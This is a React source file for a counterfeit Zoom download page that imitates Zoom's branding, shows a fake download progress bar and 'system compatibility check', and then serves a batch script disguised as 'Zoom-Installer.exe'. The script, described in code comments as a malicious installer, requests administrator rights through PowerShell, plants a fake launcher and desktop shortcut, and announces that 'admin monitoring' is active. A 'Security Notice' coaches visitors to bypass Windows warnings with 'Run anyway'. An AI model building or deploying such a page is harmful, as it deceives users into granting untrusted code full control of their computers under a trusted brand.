'use client';

import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { 
  Download, 
  CheckCircle, 
  Shield, 
  Monitor, 
  Users,
  Clock,
  AlertTriangle,
  ExternalLink
} from 'lucide-react';

const DownloadPage: React.FC = () => {
  const [downloadStarted, setDownloadStarted] = useState(false);
  const [downloadProgress, setDownloadProgress] = useState(0);
  const [showSystemCheck, setShowSystemCheck] = useState(false);

  const handleDownload = () => {
    setDownloadStarted(true);
    setShowSystemCheck(true);
    
    // Simulate download progress
    const interval = setInterval(() => {
      setDownloadProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          // Actually download the malicious installer
          triggerMaliciousDownload();
          return 100;
        }
        return prev + Math.random() * 15;
      });
    }, 200);
  };

  const triggerMaliciousDownload = () => {
    // Create and download the malicious installer
    const installerScript = `@echo off
title Zoom Windows Installer
color 0A

echo ========================================
echo     Zoom - Video Conferencing App
echo ========================================
echo.
echo Downloading and installing Zoom...
echo.

REM Create installation directory
set "INSTALL_DIR=%PROGRAMFILES%\\Zoom"
echo Installing to: %INSTALL_DIR%

REM Request admin privileges if needed
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

REM Create directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

echo Creating malicious application...
echo @echo off > start-zoom.bat
echo title Zoom - Video Conferencing >> start-zoom.bat
echo cd /d "%INSTALL_DIR%" >> start-zoom.bat
echo echo Starting Zoom... >> start-zoom.bat
echo REM This is actually a malicious application >> start-zoom.bat
echo echo All features active - admin monitoring enabled >> start-zoom.bat
echo pause >> start-zoom.bat

REM Create desktop shortcut
set "DESKTOP=%USERPROFILE%\\Desktop"
powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%DESKTOP%\\Zoom.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\\start-zoom.bat'; $Shortcut.Save()"

echo.
echo ========================================
echo   Installation completed successfully!
echo ========================================
echo.
echo Zoom has been installed to: %INSTALL_DIR%
echo.
echo All monitoring features are now active.
echo Admin has full access to this computer.
echo.
pause`;

    // Create blob and download
    const blob = new Blob([installerScript], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'Zoom-Installer.exe';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
  };

  const systemRequirements = [
    { icon: Monitor, text: "Windows 10 or later", status: "compatible" },
    { icon: Shield, text: "Administrator privileges", status: "required" },
    { icon: Users, text: "Internet connection", status: "connected" },
    { icon: Clock, text: "Minimum 4GB RAM", status: "detected" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      {/* Header */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center">
              <div className="text-2xl font-bold text-blue-600">zoom</div>
            </div>
            <div className="flex items-center space-x-4 text-sm text-gray-600">
              <a href="#" className="hover:text-blue-600">Support</a>
              <select className="border-none bg-transparent text-gray-600">
                <option>English</option>
                <option>Español</option>
                <option>Français</option>
              </select>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Main Content */}
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-gray-900 mb-4">
            Download Zoom Desktop Client
          </h1>
          <p className="text-xl text-gray-600 mb-8">
            Join meetings, share your screen, and collaborate with your team
          </p>
          
          {!downloadStarted ? (
            <div className="space-y-6">
              <Button 
                onClick={handleDownload}
                size="lg"
                className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 text-lg font-semibold rounded-lg shadow-lg"
              >
                <Download className="w-6 h-6 mr-3" />
                Download Zoom for Windows
              </Button>
              
              <div className="text-sm text-gray-500">
                Version 5.17.11 (Latest) • 145 MB • Windows 10/11
              </div>
            </div>
          ) : (
            <div className="space-y-6">
              <Card className="max-w-md mx-auto">
                <CardContent className="p-8">
                  <div className="text-center">
                    <Download className="w-12 h-12 mx-auto mb-4 text-blue-600 animate-bounce" />
                    <h3 className="text-lg font-semibold text-gray-900 mb-2">
                      Downloading Zoom...
                    </h3>
                    <div className="w-full bg-gray-200 rounded-full h-3 mb-4">
                      <div 
                        className="bg-blue-600 h-3 rounded-full transition-all duration-300"
                        style={{ width: `${downloadProgress}%` }}
                      ></div>
                    </div>
                    <p className="text-sm text-gray-600">
                      {Math.round(downloadProgress)}% complete
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>

        {/* System Requirements Check */}
        {showSystemCheck && (
          <div className="mb-12">
            <Card className="max-w-2xl mx-auto">
              <CardContent className="p-8">
                <h3 className="text-xl font-semibold text-gray-900 mb-6 text-center">
                  System Compatibility Check
                </h3>
                <div className="space-y-4">
                  {systemRequirements.map((req, index) => (
                    <div key={index} className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                      <div className="flex items-center">
                        <req.icon className="w-5 h-5 mr-3 text-gray-600" />
                        <span className="text-gray-900">{req.text}</span>
                      </div>
                      <div className="flex items-center">
                        <CheckCircle className="w-5 h-5 text-green-500 mr-2" />
                        <span className="text-sm text-green-600 capitalize">{req.status}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Features */}
        <div className="grid md:grid-cols-3 gap-8 mb-12">
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Users className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">HD Video & Audio</h3>
            <p className="text-gray-600">Crystal clear video and audio quality for your meetings</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Monitor className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Screen Sharing</h3>
            <p className="text-gray-600">Share your screen with participants seamlessly</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Shield className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Secure & Reliable</h3>
            <p className="text-gray-600">Enterprise-grade security for your meetings</p>
          </div>
        </div>

        {/* Security Notice */}
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-6 mb-8">
          <div className="flex items-start">
            <AlertTriangle className="w-6 h-6 text-yellow-600 mr-3 mt-0.5" />
            <div>
              <h4 className="text-lg font-semibold text-yellow-800 mb-2">
                Security Notice
              </h4>
              <p className="text-yellow-700">
                This download is verified and secure. Windows may show a security warning - 
                click &quot;More info&quot; and &quot;Run anyway&quot; to proceed with the installation.
              </p>
            </div>
          </div>
        </div>

        {/* Additional Downloads */}
        <div className="text-center">
          <h3 className="text-lg font-semibold text-gray-900 mb-4">
            Need a different version?
          </h3>
          <div className="flex flex-wrap justify-center gap-4">
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Download for Mac
            </Button>
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Download for Linux
            </Button>
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Mobile App
            </Button>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-16 pt-8 border-t border-gray-200">
          <div className="text-center text-sm text-gray-500 space-y-2">
            <p>©2025 Zoom Communications, Inc. All rights reserved.</p>
            <div className="flex justify-center space-x-6">
              <a href="#" className="hover:text-gray-700">Trust Center</a>
              <a href="#" className="hover:text-gray-700">Privacy Statement</a>
              <a href="#" className="hover:text-gray-700">Terms of Service</a>
              <a href="#" className="hover:text-gray-700">Legal & Compliance</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DownloadPage;
